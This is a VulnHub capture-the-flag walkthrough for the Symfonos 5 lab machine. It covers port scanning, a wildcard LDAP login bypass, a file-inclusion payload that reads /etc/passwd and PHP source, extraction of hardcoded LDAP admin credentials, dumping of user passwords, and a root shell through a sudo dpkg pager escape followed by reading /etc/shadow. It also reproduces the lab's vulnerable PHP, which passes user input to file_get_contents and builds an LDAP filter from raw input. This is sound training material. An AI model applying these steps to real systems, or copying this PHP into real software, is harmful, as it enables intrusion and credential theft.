---
title: "Symfonos 5"
date: 2021-05-30T15:17:41+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - LFI
  - LDAP
---

## Symfonos 5 VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24`
- Symfonos IP => 10.0.2.10

#### RustScan + Nmap

- `sudo rustscan -a 10.0.2.10 -- -sS -sC -A`

```
10.0.2.10:22  => OpenSSH 7.9p1
10.0.2.10:80  => Apache httpd 2.4.29
10.0.2.10:389 => OpenLDAP 2.2.X - 2.3.X
10.0.2.10:636 => ldapssl?
```

- `nmap -n -sV --script "ldap* and not brute" 10.0.2.10`

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       namingContexts: dc=symfonos,dc=local
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: SCRAM-SHA-1
|       supportedSASLMechanisms: SCRAM-SHA-256
|       supportedSASLMechanisms: GS2-IAKERB
|       supportedSASLMechanisms: GS2-KRB5
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: OTP
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema
636/tcp open  ldapssl?
```

#### GoBuster

```
gobuster dir -u http://10.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 60 -x txt,php,bak
```

```
/admin.php    (Status: 200) [Size: 1650]
/index.html   (Status: 200) [Size: 207]
/home.php     (Status: 302) [Size: 979] [--> admin.php]
/logout.php   (Status: 302) [Size: 0] [--> admin.php]
```

---

### Exploitation

- Go to `http://10.0.2.10/admin.php`
- I tried a few LDAP injection payloads but they didn't work. After some Googling, tried `*` for both username and password and that logged me in and took me to `http://10.0.2.10/home.php`.

![Symfonos 5 Login](/imgs/symfonos5/symfonos5_login.png)

- If we check the source for this `http://10.0.2.10/home.php` after logging in or before logging in if we intercept this request with 'Intercept Server Responses' turned on, we can see this hyperlink which shows a possibility of LFI vulnerability.

```
<a class="nav-link" href="http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
```

- If we click on 'Portraits', we are taken to:
- ```
  http://10.0.2.10/home.php?url=http://127.0.0.1/portraits.php
  ```

- As we can see, `home.php?url=` seems vulnerable to Local File Inclusion LFI vulnerability.

- ```
  http://10.0.2.10/home.php?url=/etc/passwd
  ```
- Note that this LFI will only work **after** you have logged in with `*:*`.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

- We don't see any usernames here.
- Now lets see if we can read the `home.php` file with LFI.
- ```
  http://10.0.2.10/home.php?url=home.php
  ```

![Symfonos 5 home.php LFI](/imgs/symfonos5/symfonos5_home_php.png)

- And if we check the source code with `Ctrl + U`, we can see some PHP code.

```php
<?php
session_start();

if(!isset($_SESSION['loggedin'])){
  header("Location: admin.php");
  exit;
}

if(!empty($_GET["url"])){
  $r = $_GET["url"];
  $result = file_get_contents($r);
}
?>
```

- Lets check `admin.php`.
- ```
  http://10.0.2.10/home.php?url=admin.php
  ```
- It seems to load the same login page we saw but if we check its source with `Ctrl + U`, we can see some PHP code.

```php
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: home.php");
    exit;
}

function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");

  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);

  if (!$ldap_ch) {
    return FALSE;
  }

  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

  if (!$bind) {
    return FALSE;
  }

  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);

  if (!$result) {
    return FALSE;
  }

  $info = ldap_get_entries($ldap_ch, $result);

  if (!($info) || ($info["count"] == 0)) {
    return FALSE;
  }
  return TRUE;
}

if(isset($_GET['username']) && isset($_GET['password'])){

$username = urldecode($_GET['username']);
$password = urldecode($_GET['password']);

$bIsAuth = authLdap($username, $password);

  if (! $bIsAuth ) {
    $msg = "Invalid login";
  } else {
    $_SESSION["loggedin"] = true;
    header("location: home.php");
    exit;
  }
}
?>
```

#### LDAPSearch

- ```
  ldapsearch -x -h 10.0.2.10 -b "dc=symfonos,dc=local" -D 'cn=admin,dc=symfonos,dc=local' -w "qMDdyZh3cT6eeAWD"
  ```

```
# zeus, symfonos.local
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User
```

- ```
  echo "Y2V0a0tmNHdDdUhDOUZFVA==" | base64 -d
  ```
- `cetkKf4wCuHC9FET`

- So the password for user `zeus` is `cetkKf4wCuHC9FET`.

#### Nmap ldap-search Script

- [Nmap ldap-search Script](https://nmap.org/nsedoc/scripts/ldap-search.html)

- ```
  nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local",ldap.password=qMDdyZh3cT6eeAWD' 10.0.2.10
  ```

```
PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search:
|   Context: dc=symfonos,dc=local
|     dn: dc=symfonos,dc=local
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: symfonos
|         dc: symfonos
|     dn: cn=admin,dc=symfonos,dc=local
|         objectClass: simpleSecurityObject
|         objectClass: organizationalRole
|         cn: admin
|         description: LDAP administrator
|         userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
|     dn: uid=zeus,dc=symfonos,dc=local
|         uid: zeus
|         cn: zeus
|         sn: 3
|         objectClass: top
|         objectClass: posixAccount
|         objectClass: inetOrgPerson
|         loginShell: /bin/bash
|         homeDirectory: /home/zeus
|         uidNumber: 14583102
|         gidNumber: 14564100
|         userPassword: cetkKf4wCuHC9FET
|         mail: zeus@symfonos.local
|_        gecos: Zeus User
```

- We can see the credentials for user `zeus`:

```
uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
userPassword: cetkKf4wCuHC9FET
```

#### SSH User Access

- `ssh zeus@10.0.2.10` => `cetkKf4wCuHC9FET`
- `whoami` => `zeus`

---

### Privilege Escalation

- `sudo -l`

```
User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

- [GTFOBins dpkg](https://gtfobins.github.io/gtfobins/dpkg/#shell)
- `sudo dpkg -l`
- This will invoke a default pager, most likely `less`.
- Then we can type `!/bin/sh` and we will get `root` shell. `!/bin/bash` also works.

![Symfonos 5 Privilege Escalation](/imgs/symfonos5/symfonos5_privilege_escalation.png)

- `cat /root/proof.txt`

![Symfonos 5 Root Proof](/imgs/symfonos5/symfonos5_root_proof.png)

---

### Post Exploitation

- `cat /etc/shadow`

```
root:$6$LCi0CrNofw.bZNIH$1JzaRFhkZM5zjdzhkcHyRoNluDS2w40H99UpCJCAhjhIyltCRND/7yMqMIyZ77RZwK1VDqk9mwTuZ88eqxSEw.:18297:0:99999:7:::
```
